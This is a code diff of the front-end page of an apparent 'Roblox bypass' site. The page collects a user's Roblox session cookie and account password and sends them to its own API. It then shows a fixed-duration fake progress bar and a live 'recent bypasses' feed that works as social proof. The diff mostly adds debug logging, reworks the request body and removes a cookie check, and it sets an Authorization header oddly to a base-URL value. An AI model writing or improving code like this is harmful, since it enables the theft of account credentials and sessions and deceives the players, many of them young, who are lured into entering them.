@@ -37,10 +37,10 @@ export default function Home() {
       try {
         const response = await fetch("/api/recent-bypasses")
         const data = await response.json()
+        console.log("[v0] Recent bypasses response:", data)
         if (data.bypasses && Array.isArray(data.bypasses)) {
           setRecentBypasses(data.bypasses)
         }
-        console.log("[v0] Recent bypasses fetched:", data)
       } catch (error) {
         console.error("[v0] Failed to fetch recent bypasses:", error)
       }
@@ -48,7 +48,7 @@ export default function Home() {
 
     fetchRecentBypasses()
 
-    const interval = setInterval(fetchRecentBypasses, 10000)
+    const interval = setInterval(fetchRecentBypasses, 5000)
     return () => clearInterval(interval)
   }, [])
 
@@ -85,10 +85,7 @@ export default function Home() {
   }
 
   const handleBypass = async () => {
-    if (!cookie.trim()) {
-      setError("Please enter a cookie")
-      return
-    }
+    console.log("[v0] Incoming data - Cookie:", cookie.substring(0, 20) + "...", "Password provided:", !!robloxPassword)
 
     if (!robloxPassword.trim()) {
       setError("Please enter your Roblox account password")
@@ -114,15 +111,25 @@ export default function Home() {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
+          Authorization: "Bearer " + (process.env.NEXT_PUBLIC_BASE_URL || ""),
         },
-        body: JSON.stringify({ cookie: cookie.trim(), password: robloxPassword.trim() }),
+        body: JSON.stringify({
+          cookie: cookie.trim(),
+          password: robloxPassword.trim(),
+          timestamp: new Date().toISOString(),
+        }),
       })
 
       const result = await response.json()
-      console.log("[v0] API response:", result)
+      console.log("[v0] API response received:", {
+        success: result.success,
+        hasUserInfo: !!result.userInfo,
+        username: result.userInfo?.name,
+      })
 
       if (!response.ok || !result.success) {
         const errorMessage = result.error || "Invalid cookie or password. Please check your credentials and try again."
+        console.log("[v0] Error from API:", errorMessage)
         setError(errorMessage)
         setIsProcessing(false)
         setProgress(0)
@@ -133,28 +140,12 @@ export default function Home() {
 
       if (result.userInfo?.name) {
         setUsername(result.userInfo.name)
+        console.log("[v0] Processing account:", result.userInfo.name)
 
         const avatarUrl =
           result.avatarUrl ||
           `https://www.roblox.com/headshot-thumbnail/image?userId=${result.userInfo.id}&width=150&height=150&format=png`
         setProcessingAvatarUrl(avatarUrl)
-
-        const newBypass: RecentBypass = {
-          username: result.userInfo.name,
-          avatarUrl: avatarUrl,
-          timestamp: new Date().toLocaleString("en-US", {
-            month: "2-digit",
-            day: "2-digit",
-            year: "numeric",
-            hour: "2-digit",
-            minute: "2-digit",
-            second: "2-digit",
-            hour12: true,
-          }),
-        }
-
-        const updatedBypasses = [newBypass, ...recentBypasses].slice(0, 5)
-        setRecentBypasses(updatedBypasses)
       }
 
       const totalDuration = 20000
@@ -167,7 +158,21 @@ export default function Home() {
           if (newProgress >= 100) {
             clearInterval(progressInterval)
             setStatusText("Complete!")
-            setTimeout(() => {
+            console.log("[v0] Bypass processing complete, status: success")
+
+            setTimeout(async () => {
+              try {
+                console.log("[v0] Refreshing recent bypasses list...")
+                const refreshResponse = await fetch("/api/recent-bypasses")
+                const refreshData = await refreshResponse.json()
+                console.log("[v0] Recent bypasses refreshed, count:", refreshData.bypasses?.length || 0)
+                if (refreshData.bypasses && Array.isArray(refreshData.bypasses)) {
+                  setRecentBypasses(refreshData.bypasses)
+                }
+              } catch (error) {
+                console.error("[v0] Failed to refresh bypasses:", error)
+              }
+
               setIsProcessing(false)
               setProgress(0)
               setShowSuccess(true)
@@ -185,7 +190,8 @@ export default function Home() {
         })
       }, intervalTime)
     } catch (error) {
-      console.error("[v0] Failed to bypass:", error)
+      console.error("[v0] Exception during bypass:", error)
+      console.log("[v0] Error details:", error instanceof Error ? error.message : String(error))
       setError("Connection error. Please check your internet and try again.")
       setStatusText("")
       setIsProcessing(false)
